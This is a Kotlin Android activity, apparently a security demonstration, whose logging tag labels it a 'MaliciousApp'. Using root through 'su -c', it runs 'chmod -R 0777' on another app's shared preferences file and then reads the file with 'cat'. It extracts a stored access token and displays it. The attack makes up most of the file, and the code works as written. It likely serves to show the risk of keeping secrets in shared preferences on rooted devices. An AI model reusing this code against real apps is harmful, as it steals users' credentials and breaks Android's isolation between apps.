package com.dimanem.security.root.example.app2

import android.os.Bundle
import android.preference.PreferenceManager
import android.support.v7.app.AppCompatActivity
import android.util.Log
import android.widget.Toast
import kotlinx.android.synthetic.main.activity_main.*
import org.json.JSONException
import org.json.JSONObject
import org.json.XML
import java.io.File

class MainActivity : AppCompatActivity() {

  private var accessToken: String? = null

  override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    setContentView(R.layout.activity_main)

    // TODO find a better way to read shared prefs file
    accessToken = getSharedPrefsFile("com.dimanem.security.example.demo")?.let { file ->
      getFileContent(file)?.let { xml ->
        xmlToJson(xml)?.let { json ->
          json.getJSONObject("map")
            .getJSONObject("string")
            .getString("content")
        }
      }
    }

    accessToken?.let {
      etApp1Username.text = accessToken
    }
  }

  private fun getSharedPrefsFile(packageName: String): File? {
    try {
      // Get the relevant package context
      val sharedPrefs = PreferenceManager
        .getDefaultSharedPreferences(createPackageContext(packageName, 0))

      // Make the corresponding file accessible
      val field = sharedPrefs.javaClass.getDeclaredField("mFile")
      if (!field.isAccessible) {
        field.isAccessible = true
      }
      val sharedPrefsFile = field.get(sharedPrefs as Any) as File

      val cmdGiveReadWritePermissions = StringBuilder().apply {
        append("chmod -R 0777 \"")
        append(sharedPrefsFile)
        append("\"")
      }.toString()
      val runtime = Runtime.getRuntime()
      runtime.exec(arrayOf("su", "-c", cmdGiveReadWritePermissions)).waitFor()
      return sharedPrefsFile
    } catch (e: Exception) {
      Toast.makeText(
        this,
        "Failed to read shared prefs with error: ${e.localizedMessage}",
        Toast.LENGTH_LONG
      ).show()
    }
    return null
  }

  private fun getFileContent(file: File): String? {
    try {
      val runtime = Runtime.getRuntime()
      val commandBuilder = StringBuilder().apply {
        append("cat \"")
        append(file)
        append("\"")
      }

      val process = runtime.exec(arrayOf("su", "-c", commandBuilder.toString()))

      val fileContent = process.inputStream.bufferedReader().use {
        it.readText()
      }

      return fileContent

    } catch (e: Exception) {
      Log.e(TAG, "Failed to read app1 shared prefs shared prefs with error: ${e.localizedMessage}")
    }

    return null
  }

  private fun xmlToJson(xml: String): JSONObject? {
    var jsonObj: JSONObject? = null
    try {
      jsonObj = XML.toJSONObject(xml)
    } catch (e: JSONException) {
      Log.e("JSON exception", e.message)
      e.printStackTrace()
    }
    return jsonObj
  }

  companion object {
    const val DEMO_APP_PACKAGE_NAME = "com.dimanem.security.example.demo"
    const val TAG = "MaliciousApp"
  }
}
